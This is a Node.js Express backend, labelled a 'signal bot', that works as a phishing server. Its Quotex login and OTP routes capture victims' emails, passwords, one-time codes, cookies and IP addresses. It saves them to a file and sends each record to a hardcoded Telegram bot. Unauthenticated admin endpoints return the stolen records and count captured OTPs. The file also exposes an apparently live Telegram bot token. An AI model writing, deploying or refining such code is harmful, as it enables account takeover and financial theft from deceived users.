const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ================== YOUR TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

// Function to send message to Telegram
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Message sent to Telegram");
    } catch (error) {
        console.error("❌ Telegram Error:", error.message);
    }
}

// ================== FIXED: DATA PERSISTENCE WITH users.json ==================
const DATA_FILE = path.join(__dirname, 'users.json');
let users = [];

// Load users on startup
function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            users = JSON.parse(data);
            console.log(`✅ Loaded ${users.length} users`);
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) {
        console.log("Created new users.json");
        users = [];
    }
}

// Save after every change
function saveUsers() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
    } catch (e) {
        console.error("Save error:", e);
    }
}

loadUsers();

// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    let user = users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = {
            id: Date.now().toString(),
            licenceKey: licenceKey,
            fullName: fullName,
            username: "",
            password: "",
            otp: "",
            ip: "",
            cookies: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString()
        };
        users.unshift(user);
        console.log(`🆕 New user created with licenceKey: ${licenceKey}`);
    }
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// ================== EXISTING ROUTES (KEPT INTACT) ==================
// SSE, trigger-connected, license-activate, track-activity, notification-permission etc. remain unchanged

// ================== FIXED QUOTEX LOGIN & OTP ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";

    // FIXED: Step-by-step Telegram notification
    await sendTelegramMessage(`
🔑 <b>Quotex Login Details Received</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 Password: <b>${password}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK')}</b>
    `);

    res.status(200).send({ status: "ok" });
});

app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.otp = otp;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";

    // FIXED: Step-by-step Telegram notification
    await sendTelegramMessage(`
🔢 <b>OTP Received</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 OTP: <b>${otp}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK')}</b>
    `);

    res.status(200).send({ status: "ok" });
});

// ================== ADMIN PANEL ENDPOINTS ==================
app.get('/api/stats', (req, res) => {
    const stats = {
        totalUsers: users.length,
        onlineNow: users.filter(u => u.status === "Online").length,
        otpCaptured: users.filter(u => u.otp && u.otp.length > 0).length,
        connectedAccounts: users.filter(u => u.connected).length
    };
    res.json(stats);
});

app.get('/api/users', (req, res) => {
    res.json(users);
});

app.get('/api/latest-activity', (req, res) => {
    res.json({
        logins: users.filter(u => u.username),
        otps: users.filter(u => u.otp)
    });
});

// Root Route
app.get('/', (req, res) => {
    res.send("✅ Chinese Signal Bot Backend is Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
